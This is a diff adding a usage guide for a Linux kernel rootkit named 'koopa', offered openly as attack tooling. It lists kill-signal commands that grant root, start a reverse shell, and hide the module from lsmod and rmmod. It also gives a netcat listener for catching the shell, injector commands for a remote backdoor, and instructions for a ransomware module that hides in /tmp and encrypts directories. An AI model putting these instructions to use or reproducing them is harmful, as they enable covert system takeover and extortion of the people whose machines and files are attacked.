@@ -1,0 +1,22 @@
+THIS IS NOT AN ORDER LIST, IM JUST SHOWING WHAT YOU CAN DO
+
+LOCAL CONTROL:
+1. send signal 50 to any pid: kill -50 1 
+2. put the IP + port you want in CONFIG.H before building the rootkit. default is 127.0.0.1:5888(listen at remote host with: nc -lvp 5888)
+3. start the shell with kill -51 1 (also loads reverse shell)
+4. invisible mode stops the rootkit from being sniffed by ismod or being removed by rmmod (kill -52 1)
+5. kill -53 1 unhides the rootkit
+
+REMOTE CONTROL:
+1. ./injector -S 127.0.0.1 to get remote shell via backdoor and backdoor listens for packets using KOOPA_PAYLOAD_GET_REVERSE_SHELL
+or you could build your own injector using my library Caps(it should be in madlib)
+2. hiding the rootkit (./injector -i 127.0.0.1)
+3. unhiding the rootkit (./injector -u 127.0.0.1)
+4. full guide on the injector is (./injector -h)
+
+THE GOOD SHIT( RANSOM MODULE):
+1. modules are in /tmp/koopa and cant be found using ls or stuff of the sort
+2. btw the encrypted files have a .ubr extension( i wanted to name it uber instead but ubr is cooler)
+3. to encrypt a dir and its subdirs (./injector -p /Your/Path/To/Encrypt -e 127.0.0.1)
+4. to decrypt (./injector -p /Your/Path/To/Decrypt -d 127.0.0.1)
+5. you can edit the module to add your own encryption method
